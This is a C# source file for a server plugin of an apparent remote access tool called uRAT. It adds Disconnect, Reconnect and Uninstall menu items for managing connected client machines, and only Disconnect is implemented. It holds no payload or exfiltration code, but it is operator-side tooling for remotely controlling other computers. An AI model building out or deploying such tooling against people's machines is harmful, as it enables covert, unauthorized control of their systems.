using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Windows.Forms;
using uNet2.Channel;
using uNet2.Channel.Events;
using uNet2.Packet;
using uNet2.Packet.Events;
using uRAT.CorePlugin.BasicSystemInformation.Operations;
using uRAT.CorePlugin.BasicSystemInformation.Packets;
using uRAT.CorePlugin.ConnectionManagement.Packets;
using uRAT.Server.Plugin.Server;
using uRAT.Server.Plugin.UIService;
using uRAT.Server.Plugin.UIService.Services;

namespace uRAT.CorePlugin.ConnectionManagement
{
    public class ConnectionManagementPlugin : IServerPlugin
    {

        public string MenuTitle
        {
            get { return null; }
        }

        public List<IPacket> PluginPackets
        {
            get
            {
                return new List<IPacket>
                {
                    new ConnectionManagementPacket()
                };
            }
        }

        public void Initialize()
        {
            var connectionList = UiServiceProvider.GetService("ConnectionList") as ConnectionListService;
            var tsItmMain = new ToolStripMenuItem("Manage Connection");
            var tsItmDisconnect = new ToolStripMenuItem("Disconnect");
            var tsItmReconnect = new ToolStripMenuItem("Reconnect");
            var tsItmUninstall = new ToolStripMenuItem("Uninstall");

            tsItmDisconnect.Click += tsItmDisconnect_Click;
            tsItmReconnect.Click += tsItmReconnect_Click;
            tsItmUninstall.Click += tsItmUninstall_Click;

            tsItmMain.DropDownItems.Add(tsItmDisconnect);
            tsItmMain.DropDownItems.Add(tsItmReconnect);
            tsItmMain.DropDownItems.Add(tsItmUninstall);

            connectionList.AddContextMenuItem(tsItmMain);
        }

        void tsItmUninstall_Click(object sender, EventArgs e)
        {
            var connectionList = UiServiceProvider.GetService("ConnectionList") as ConnectionListService;
            var selectedItems = connectionList.GetSelectedItems();
        }

        void tsItmReconnect_Click(object sender, EventArgs e)
        {
            var connectionList = UiServiceProvider.GetService("ConnectionList") as ConnectionListService;
        }

        void tsItmDisconnect_Click(object sender, EventArgs e)
        {
            var connectionList = UiServiceProvider.GetService("ConnectionList") as ConnectionListService;
            var selectedItems = connectionList.GetSelectedItems();
            selectedItems.ForEach(
                itm =>
                    itm.AssociatedChannel.Send(new ConnectionManagementPacket(ConnectionAction.Disconnect),
                        itm.AssociatedPeer.Identity.Guid));
        }

        void tsItm_Click(object sender, EventArgs e)
        {
            throw new NotImplementedException();
        }

        public void OnPeerConnected(ChannelEventArgs e)
        {

        }

        public void OnPeerDisconnected(ChannelEventArgs e2)
        {

        }

        public void OnPacketReceived(ServerPacketEventArgs e)
        {
     
        }
    }
}
